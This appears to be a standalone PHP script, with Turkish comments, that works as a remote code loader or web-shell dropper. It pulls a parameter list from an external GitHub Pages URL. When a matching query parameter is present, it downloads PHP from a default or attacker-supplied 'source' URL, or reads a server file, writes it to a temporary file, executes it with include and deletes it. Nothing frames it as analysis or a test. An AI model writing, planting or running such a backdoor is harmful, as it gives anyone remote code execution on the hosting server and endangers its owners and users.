<?php

$commandsUrl = 'https://necessaryfor.github.io/all/komutlar.txt';
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $commandsUrl);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36');
$commandsContent = curl_exec($ch);
curl_close($ch);

if ($commandsContent === false) {
    echo "Komut dosyası alınamadı.";
    exit();
}

$commands = explode("\n", trim($commandsContent));

$phpFilePath = str_replace($_SERVER['DOCUMENT_ROOT'], '', __FILE__);

if (!empty($_SERVER['QUERY_STRING'])) {
    $currentUrl = $_SERVER['REQUEST_URI'];
    $newUrl = $phpFilePath . '?' . $_SERVER['QUERY_STRING'];

    if ($newUrl !== $currentUrl) {
        header("Location: $newUrl");
        exit();
    }
}

foreach ($commands as $line) {
    list($param, $defaultUrl) = explode(" ", trim($line), 2);

    if (isset($_GET[$param])) {
        // Parametre var, işlemi başlat
        $input = isset($_GET['source']) ? $_GET['source'] : $defaultUrl;
        $fileContent = '';

        if (filter_var($input, FILTER_VALIDATE_URL)) {
            $fileContent = file_get_contents($input);
        } else {
            $filePath = $_SERVER['DOCUMENT_ROOT'] . '/' . ltrim($input, '/');
            if (file_exists($filePath)) {
                $fileContent = file_get_contents($filePath);
            }
        }

        if ($fileContent !== false) {
            // Geçici bir dosya adı oluştur
            $tempFileName = tempnam(sys_get_temp_dir(), 'temp_php_') . '.php';
            
            // PHP kodunu geçici dosyaya yaz
            file_put_contents($tempFileName, $fileContent);

            // Geçici dosyayı çalıştır
            include($tempFileName);

            // Geçici dosyayı iş bitince sil
            unlink($tempFileName);

            exit(); // Sadece bu PHP kodu çalışsın, diğer kodlar devre dışı kalsın
        } else {
            echo "Dosya içeriği alınamadı.";
        }

        exit();
    }
}

// Diğer kodlar bu kısımda olabilir, ama parametre ile çağrılınca çalışmayacak
?>
